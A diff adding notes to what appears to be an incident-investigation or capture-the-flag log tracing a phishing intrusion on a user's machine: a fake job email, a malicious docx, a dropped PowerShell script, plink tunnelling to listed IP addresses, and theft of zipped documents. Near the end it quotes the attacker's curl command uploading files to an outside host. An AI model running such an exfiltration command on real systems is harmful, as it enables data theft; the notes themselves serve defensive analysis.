@@ -14,3 +14,18 @@ The SHA-256 of the file is 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a
 The powershell script written to disk after downloading the docx was hacktivist_manifesto.ps1
 It created three different unique events. One was the first time it ran one was the schtask to make it run recurringly and one was for it bypass policy
 plink.exe is run for 136.130.190.181 on port 3389 for RDP
+Another suspicous address found was valdorias_best_recruiter@gmail.com
+The email was sent to Ronnie Mclovin at 2024-01-10 08:48:16+00:00
+Email had a link to https://promotionrecruit[.]org/share/Editorial_J0b_Openings_2024.docx
+Ronnie CLicked the link on 2024-01-10 08:55:07+00:00
+Editorial_J0b_Openings_2024.docx was downloaded to his machine at 2024-01-10 08:55:17+00:00
+hacktivist_manifesto.ps1 was dropped into his machine at 2024-01-10 08:55:51+00:00
+168.57.191.100 was used with Plink on Ronnie's machine A37A-DESKTOP
+Investigative buddy found the following suspicious file on Ronnie's machine fakestory.docx the link it was downlaoded from is https://hire-recruit[.]org/files/fakescandal/2024/fakestory.docx
+Sha-256 of fakestory.docx is 5f8a7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f
+Fakestory.docx was created on Ronnie's desktop at 2024-01-31 09:47:51+00:00
+New file path for fakestory.docx was C:\\Users\\romclovin\\Documents\\OpEdFinal_to_print.docx which was the file sent to CLark Kent by Ronnie McLovin
+User's memes, documents and Desktop were also stolen and is being sold on the dark web.
+Attacker exfiltarted all zipped data via the cmd curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php
+
+
